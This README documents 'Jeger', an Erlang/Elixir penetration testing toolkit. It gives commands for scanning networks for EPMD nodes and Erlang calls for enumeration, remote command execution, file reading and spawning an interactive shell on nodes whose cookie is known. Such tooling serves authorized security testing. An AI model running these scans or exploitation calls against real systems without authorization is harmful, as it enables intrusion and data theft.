# Jeger

Erlang/Elixir node discovery and penetration testing toolkit.

## Features

- **Discovery**: EPMD scanning and node enumeration
- **Fingerprinting**: System info and version detection
- **Vulnerability Scanning**: Security misconfiguration detection
- **Exploitation**: RCE and post-exploitation capabilities

## Build

```bash
rebar3 escriptize
```

## Usage

### Prerequisites

Jeger targets **distributed Erlang/Elixir systems**. You need:
- Target nodes running with EPMD (Erlang Port Mapper Daemon)
- Network access to port 4369 (EPMD) and distribution ports
- Knowledge of the Erlang cookie (for enumeration/exploitation)

### Local Testing

```bash
# Terminal 1: Start a test node
erl -sname myapp -setcookie secret123

# Terminal 2: Scan for it
./_build/default/bin/jeger -r 127.0.0.1-1
```

### Remote Scanning

```bash
# Scan network range
./_build/default/bin/jeger -r 192.168.1.1-254

# Scan specific subnet
./_build/default/bin/jeger -r 10.0.0.1-100 -t 2000 -c 100

# Corporate network scan
./_build/default/bin/jeger -r 172.16.0.1-254
```

### Real-World Scenarios

**Phoenix/Elixir apps:**
```bash
# Development environments often expose EPMD
jeger -r 192.168.1.1-254

# Production clusters
jeger -r 10.20.30.1-254 -t 5000
```

**Distributed Erlang clusters:**
```bash
# RabbitMQ, CouchDB, ejabberd, etc.
jeger -r 172.16.0.1-100
```

## Programmatic Usage

Start an Erlang shell with Jeger:

```bash
rebar3 shell
```

### Discovery

```erlang
%% Scan IP range
{ok, Hosts} = jeger_discovery:discover({"192.168.1.", 1, 254}, #{}).

%% With options
{ok, Hosts} = jeger_discovery:discover({"192.168.1.", 1, 10}, #{
    timeout => 2000,
    concurrency => 100,
    verbose => true
}).
```

### Enumeration

```erlang
%% Enumerate single node
{ok, Info} = jeger_enum:enumerate_node("192.168.1.5", "myapp", secret).

%% View formatted output
io:format("~s", [jeger_enum:format_enumeration(Info)]).
```

### Vulnerability Scanning

```erlang
%% Scan for vulnerabilities
{ok, Findings} = jeger_scan:scan_node("192.168.1.5", "myapp", secret).

%% Format findings
io:format("~s", [jeger_scan:format_findings(Findings)]).
```

### Exploitation

```erlang
%% Execute command
{ok, Result} = jeger_exploit:execute_command("192.168.1.5", "myapp", secret, "os:cmd(\"whoami\")").

%% Read file
{ok, Content} = jeger_exploit:read_file("192.168.1.5", "myapp", secret, "/etc/hosts").

%% List directory
{ok, Files} = jeger_exploit:list_directory("192.168.1.5", "myapp", secret, "/tmp").

%% Spawn interactive shell
{ok, Pid} = jeger_exploit:spawn_shell("192.168.1.5", "myapp", secret).
```

## Testing

```bash
rebar3 eunit
```

## Warning

**For authorized security assessments only.** Unauthorized access is illegal.

## License

Apache-2.0
